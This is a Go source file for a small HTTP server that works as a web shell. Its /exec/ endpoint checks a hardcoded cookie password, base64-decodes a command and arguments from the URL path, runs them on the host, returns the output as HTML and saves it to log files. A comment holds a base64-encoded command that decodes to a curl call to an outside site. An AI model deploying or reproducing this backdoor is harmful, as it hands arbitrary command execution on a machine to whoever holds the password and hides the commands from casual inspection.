package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// http.Redirect(w, r, "http://www.google.com", 301)

var pass string

// var mtx *sync.RWMutex
// var m map[string]string

func main() {
	u, err := uuid.NewRandom()
	if err != nil {
		log.Println(err)
		return
	}
	pass = u.String()
	pass = `passport`

	log.Println(fmt.Sprintf(`%s`, pass))

	// m = make(map[string]string)

	http.HandleFunc("/exec/", httpExec)
	http.HandleFunc("/set/", httpSet)

	log.Fatal(http.ListenAndServe("127.111.0.1:8080", nil))
}

func httpSet(w http.ResponseWriter, r *http.Request) {
	arr := strings.Split(r.URL.Path, "/")
	cookie := arr[len(arr)-1]
	// fmt.Printf("Req: %s %s\n", fmt.Sprintf(`pass=%s`, cookie), r.URL.Path)
	w.Header().Set(`Set-Cookie`, fmt.Sprintf(`pass=%s; Path=/`, cookie))
	http302(w)
}

func httpExec(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie(`pass`)
	if err != nil {
		log.Println("Error occured while reading cookie")
		http302(w)
		return
	}
	fmt.Println(cookie.Value == pass)
	if cookie.Value != pass {
		http302(w)
		return
	}
	if r.Method == `GET` {
		// Y3VybC5leGU= LWt2 aHR0cHM6Ly9oYW5hLXN3ZWV0LnRvcA==
		path := strings.Split(r.URL.Path, "/")
		cmd := path[len(path)-1]
		fmt.Println(strings.Split(cmd, " "))
		arr := strings.Split(cmd, " ")
		name, argv := base64decode(arr[0], arr[1:]...)
		out := execute(name, argv...)
		w.Write([]byte(`<html>
<head>
	<!--meta charset="gbk"-->
</head>
<body>
	<style>
		pre{
			width:50%;
			float:left;
		}
	</style>
	<pre>`))
		outG2U, err := GbkToUtf8(out)
		if err == nil {
			w.Write(outG2U)
		} else {
			w.Write(out)
		}
		w.Write([]byte(`	</pre>
	<pre>`))
		// outU2G, err := Utf8ToGbk(out)
		// if err != nil {
		// 	w.Write(outU2G)
		// } else {
		w.Write(out)
		// }
		w.Write([]byte(`	</pre>
</body>
</html>`))
	} else if r.Method == `POST` {

	}
}

func execute(name string, argv ...string) []byte {
	out, err := exec.Command(name, argv...).Output()
	// out, err := exec.Command("py", "dummy.py", "123 123").Output()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(string(out))
	save(out)
	return out
}

func save(data []byte) {
	timeUnix := time.Now().UnixMicro()
	fn := fmt.Sprintf(`%d.log`, timeUnix)
	file, err := os.Create(fn)
	defer file.Close()
	if err != nil {
		log.Println(err)
	}
	_, err = file.Write(data)
	if err != nil {
		log.Fatal(err)
	}

}

func base64decode(name string, argv ...string) (string, []string) {
	namedecode, err := base64.URLEncoding.DecodeString(name)
	if err != nil {
		log.Println(err)
	} else {
		name = string(namedecode)
	}

	for i, k := range argv {
		decode, err := base64.URLEncoding.DecodeString(k)
		if err != nil {
			log.Println(err)
		} else {
			argv[i] = string(decode)
		}
	}
	return name, argv
}

func http302(w http.ResponseWriter) {
	w.Write([]byte(`<html>
	<head></head>
	<body>
		<script>
			location.href = "/";
		</script>
	</body>
	</html>`))
}

// GBK 转 UTF-8
func GbkToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

// UTF-8 转 GBK
func Utf8ToGbk(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewEncoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}
